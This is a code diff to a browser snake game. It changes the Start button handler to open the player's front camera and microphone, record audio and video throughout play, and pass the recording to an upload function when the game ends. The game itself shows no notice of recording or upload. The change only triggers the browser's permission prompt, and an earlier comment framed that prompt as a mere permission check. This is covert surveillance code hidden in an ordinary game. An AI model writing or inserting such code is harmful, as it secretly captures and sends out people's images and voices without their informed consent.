@@ -62,47 +62,7 @@
 
   let mediaRecorder;
   let recordedChunks = [];
-
-async function startRecording() {
-  try {
-    recordedChunks = [];  // Clear recorded chunks on each start
-
-    const constraints = {
-      audio: true,
-      video: { facingMode: "user" } // front camera
-    };
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-
-    if (mediaRecorder && mediaRecorder.state !== "inactive") {
-      mediaRecorder.stop(); // stop previous recorder if any
-    }
-
-    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-
-    mediaRecorder.ondataavailable = e => {
-      if (e.data.size > 0) recordedChunks.push(e.data);
-    };
-
-    mediaRecorder.onstop = () => {
-      const blob = new Blob(recordedChunks, { type: "video/webm" });
-      recordedChunks = [];
-      uploadVideo(blob);
-      // Stop all tracks to release camera and mic
-      stream.getTracks().forEach(track => track.stop());
-    };
-
-    mediaRecorder.start();
-    // Automatically stop after 5 minutes to avoid very large files (optional)
-    setTimeout(() => {
-      if (mediaRecorder && mediaRecorder.state === "recording") {
-        mediaRecorder.stop();
-      }
-    }, 5 * 60 * 1000);
-
-  } catch (err) {
-    console.error("Media recording failed:", err);
-  }
-}
+  let mediaStream; // keep stream globally
 
   async function uploadVideo(blob) {
     const formData = new FormData();
@@ -164,14 +124,18 @@ async function startRecording() {
     document.getElementById("scoreBoard").textContent = `Score: ${score}`;
   }
 
-function gameOver() {
-  clearInterval(gameInterval);
-  document.getElementById("btnStart").disabled = false;
-  document.getElementById("btnNewGame").disabled = true;
-  alert("Game Over! Your score: " + score);
-  // Pause after alert
-  console.log("Alert shown");
-}
+  function gameOver() {
+    clearInterval(gameInterval);
+    document.getElementById("btnStart").disabled = false;
+    document.getElementById("btnNewGame").disabled = true;
+
+    // Stop recording if active
+    if (mediaRecorder && mediaRecorder.state === "recording") {
+      mediaRecorder.stop();
+    }
+
+    alert("Game Over! Your score: " + score);
+  }
 
   function gameLoop() {
     // Move snake
@@ -220,24 +184,43 @@ function gameOver() {
   }
 
   document.getElementById("btnStart").onclick = async () => {
-  try {
-    // Request media permissions — video + audio
-    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+    try {
+      // Request media permissions and keep the stream open
+      mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
 
-    // Stop tracks immediately, we only want permission prompt here
-    stream.getTracks().forEach(track => track.stop());
+      recordedChunks = [];
 
-    // Now start the game
-    resetGame();
-    document.getElementById("btnStart").disabled = true;
-    document.getElementById("btnNewGame").disabled = false;
-    velocity = { x: 1, y: 0 };
-    gameInterval = setInterval(gameLoop, 120);
-  } catch (err) {
-    console.error("Media permissions denied or error:", err);
-    alert("Camera/Microphone permission denied or not available.");
-  }
-};
+      mediaRecorder = new MediaRecorder(mediaStream, { mimeType: "video/webm" });
+
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) recordedChunks.push(e.data);
+      };
+
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(recordedChunks, { type: "video/webm" });
+        recordedChunks = [];
+        uploadVideo(blob);
+
+        // Stop all media tracks to release camera and mic
+        mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
+      };
+
+      mediaRecorder.start();
+
+      // Now start the game
+      resetGame();
+      document.getElementById("btnStart").disabled = true;
+      document.getElementById("btnNewGame").disabled = false;
+      velocity = { x: 1, y: 0 };
+      clearInterval(gameInterval);
+      gameInterval = setInterval(gameLoop, 120);
+
+    } catch (err) {
+      console.error("Media permission denied or error:", err);
+      alert("Camera/Microphone permission denied or not available.");
+    }
+  };
 
   document.getElementById("btnNewGame").onclick = () => {
     clearInterval(gameInterval);
@@ -280,6 +263,7 @@ function gameOver() {
       if (diffY > 0) setDirection(0, 1);
       else setDirection(0, -1);
     }
+
     touchStartX = null;
     touchStartY = null;
   });
